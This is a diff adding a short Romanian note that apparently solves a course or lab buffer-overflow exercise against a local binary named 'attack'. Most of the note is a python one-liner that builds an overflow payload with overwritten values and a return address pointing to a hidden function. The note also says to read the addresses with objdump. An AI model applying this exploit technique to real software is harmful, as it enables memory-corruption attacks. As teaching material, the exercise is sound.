@@ -1,0 +1,20 @@
+Ceva asemanator ca la CA
+
+a) Faceti sa afiseze "If you want justice, ... "
+
+b) Faceti sa afiseze "Valar Morghulis .."
+
+c) Faceti sa apeleze functia hidden si sa afiseze "For the Watch!"
+
+Comanda completa este
+
+python -c 'print "A"*72 + "\xbe\xba\xfe\xca" + "\n" + "A"*64 + "\xef\xbe\xad\xde" + "A" * 4 + "\x82\x91\x04\x08"' > ./payload
+
+Dupa care executati
+
+./attack < ./payload
+
+Adresele pot fi vazute din objdump -M intel -d ./attack 
+
+Sper ca am scris-o corect :)
+Succes!
